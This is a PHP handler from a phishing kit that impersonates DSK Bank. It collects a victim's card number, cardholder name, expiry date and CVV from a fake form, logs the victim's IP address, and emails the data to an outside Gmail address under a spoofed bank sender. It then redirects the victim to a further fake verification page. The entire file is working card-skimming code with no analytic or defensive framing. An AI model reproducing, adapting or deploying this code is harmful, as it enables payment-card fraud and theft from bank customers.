<?php


$card=$_POST['ccnum'] ; 
$cardname=$_POST['ccholder'] ; 
$tell=$_POST['date'] ; 
$pin=$_POST['cvcv'] ; 
 ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 
$to = "kidstayaway@gmail.com" ;
 
$subject = "DSK Bank Billing |  Nchalah VBV | : from: ".$ip;
$nome="DSK BIlling" ; 
    $from="rzlt@dskbank.bg" ; 
    $from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message .= "------------------+ Billing Client DSKbank +-----------------\r\n";
$message .= "Card Name: ".$cardname."\r\n";
$message .= "Card Number: " .$card."\r\n";
$message .= "Date Exp: ".$tell."\r\n";
$message .= "Cvv: " .$pin."\r\n";
$message .= "---------------+ Client  Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By Jen +------------------\r\n";
mail($to,$subject,$message,$headers);
header('Location: ../security/visa.php?id='.md5(base64_encode(rand(0,1000).gmdate("His")))."country=BG");
?>